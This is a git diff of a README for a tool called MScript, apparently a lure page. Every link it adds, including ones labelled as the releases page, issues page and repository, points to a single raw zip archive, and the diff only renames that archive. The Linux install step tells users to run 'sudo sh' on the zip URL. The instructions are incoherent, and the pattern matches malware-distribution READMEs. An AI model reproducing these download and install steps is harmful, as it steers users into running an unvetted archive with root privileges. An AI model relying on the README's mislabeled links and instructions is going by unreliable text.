@@ -9,7 +9,7 @@ To begin using MScript, follow these simple steps. You will be able to download 
 ### 📥 Download MScript
 **Ready to download? Click the link below:**
 
-[![Download MScript](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip)](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip)
+[![Download MScript](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip)](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip)
 
 ### 🛠 System Requirements
 Before you get started, make sure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you get started, make sure your system meets the following requirements:
 ### 🔗 Accessing the Release Page
 To download the latest version of MScript, visit the Releases page. Here, you will find all available versions of the software.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip)
 
 ## 📥 Download & Install
 1. Click the link above to go to the Releases page.
@@ -29,13 +29,13 @@ To download the latest version of MScript, visit the Releases page. Here, you wi
 3. Find the correct file for your operating system:
    - **For Windows:** Choose the `.exe` file.
    - **For macOS:** Choose the `.dmg` file.
-   - **For Linux:** Choose the `https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip` or `.sh` file.
+   - **For Linux:** Choose the `https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip` or `.sh` file.
 4. Click the corresponding link to start the download.
 5. Once downloaded, locate the file on your computer.
 6. Follow the installation prompts based on your operating system:
    - **Windows:** Double-click the `.exe` file and follow the setup instructions.
    - **macOS:** Open the `.dmg` file and drag the MScript icon to your Applications folder.
-   - **Linux:** Use the terminal to navigate to the file location, then run `sudo sh https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip` to install.
+   - **Linux:** Use the terminal to navigate to the file location, then run `sudo sh https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip` to install.
 
 ## 🎯 Features
 MScript offers a range of features to meet your deployment needs:
@@ -65,7 +65,7 @@ For detailed commands and options, refer to the documentation included with the 
 ## 📞 Getting Help
 If you encounter any issues or have questions, don’t hesitate to reach out. You can get help through the following:
 
-- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip) to report bugs or seek assistance.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip) to report bugs or seek assistance.
 - Join discussions in the [community forum](#) where users share tips and solutions.
 
 ## 🌟 Contributing
@@ -82,8 +82,8 @@ Contributions help improve the tool for everyone.
 MScript is licensed under the MIT License. You can use, modify, and distribute it freely, as long as you credit the original project.
 
 ## 🔗 Useful Links
-- [Download MScript](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/MScript_v3.0-alpha.4.zip)
+- [Download MScript](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DChomi/MScript/main/wiseacreism/Script-M-2.0.zip)
 - [Community Forum](#)
 - [Documentation](#)
 
